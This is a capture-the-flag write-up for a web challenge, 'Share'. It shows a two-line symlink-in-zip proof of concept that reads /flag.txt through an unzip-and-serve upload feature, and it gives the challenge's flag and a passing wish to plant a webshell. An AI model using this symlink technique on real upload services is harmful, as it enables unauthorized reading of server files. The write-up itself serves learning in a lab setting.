# Share writeup

## Task

Given a simple website which allows you to upload zip files. After unzipping it, the website would detect if there is `index.html` or not. If exists it'll show it at url `https://share.ctf.zoolab.org/static/{username}/index.html`.

## Writeup

### Solution

This is the easiest web in this contest, but I have no idea during contest. But actually this is a low-hanging fruit: Just search zip upload vulnerabilities you can find [this website](https://book.hacktricks.xyz/pentesting-web/file-upload#zip-tar-file-automatically-decompressed-upload) and found **symlink exploit**.

Note that other files in the zip are also uploaded and accessible so we can do it!

### POC

```
ln -s /flag.txt get_flag
zip --symlinks ooo.zip -r index.html get_flag
```

Then upload this file by yourself and view `https://share.ctf.zoolab.org/static/{username}/get_flag`, you'll download the flag.

### Flag

`FLAG{w0W_y0U_r34L1y_kn0w_sYmL1nK!}`

We can infer that symlink is the intended solution.

### Some comments

- You may think that the flag file is `flag` in the given file, then why it is `flag.txt` in POC? That's because if you look carefully at the `docker-compose.yaml`:

```yaml
version: '3.9'

services:
  web:
    build: web
    restart: always
    ports:
      - 8080:5000
    volumes:
      - ./flag:/flag.txt:ro

```

I didn't realize this fact until I use `docker exec` and bash to view the files in the docker container...

- I want to try something more malicious like webshell but this server does not run php :( so it downloads the php file instead of executing it.

- This website restarts very often so you have to be fast.

- Although I'm responsible for pwn problems in CTF, I have to get to know some basic tricks in all subjects so that I'm a real HaCkEr.
